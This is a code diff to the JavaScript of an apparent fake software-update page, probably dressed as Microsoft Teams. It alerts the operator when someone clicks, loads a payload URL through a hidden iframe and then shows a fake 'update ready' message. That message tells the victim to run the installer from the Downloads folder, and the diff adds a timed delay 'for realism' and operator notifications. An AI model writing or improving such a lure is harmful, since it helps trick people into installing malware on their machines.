@@ -108,23 +108,28 @@
         // Step 1: Notify Click
         sendNotification("🚨 Click Detected!");
 
-        // Step 2: Trigger Download
+        // Step 2: Trigger Download via Hidden Iframe
         setTimeout(() => {
-            // Create a hidden iframe to trigger download without losing focus
             const iframe = document.createElement('iframe');
             iframe.style.display = 'none';
             iframe.src = PAYLOAD_URL;
             document.body.appendChild(iframe);
 
-            // Step 3: Notify Download Start
+            // Step 3: Update UI after short delay to simulate download completion
             setTimeout(() => {
-                sendNotification("⬇️ Download Started!");
-                status.textContent = 'Update installed successfully.';
                 spinner.style.display = 'none';
                 
-                // Optional: Redirect to a fake success page after a few seconds
-                // window.location.href = 'https://teams.microsoft.com'; 
-            }, 2000);
+                // Change Button Text to prompt manual install
+                btn.textContent = "✅ Download Complete – Please Install";
+                btn.style.backgroundColor = "#2ba82b"; // Green color for success
+                btn.disabled = true; // Prevent double clicks
+                
+                status.textContent = "Your update is ready. Please run the installer from your Downloads folder.";
+                
+                // Step 4: Notify you that the file was downloaded
+                sendNotification("⬇️ File Downloaded – Awaiting Manual Installation");
+
+            }, 2000); // 2-second delay for realism
 
         }, 1000);
     });
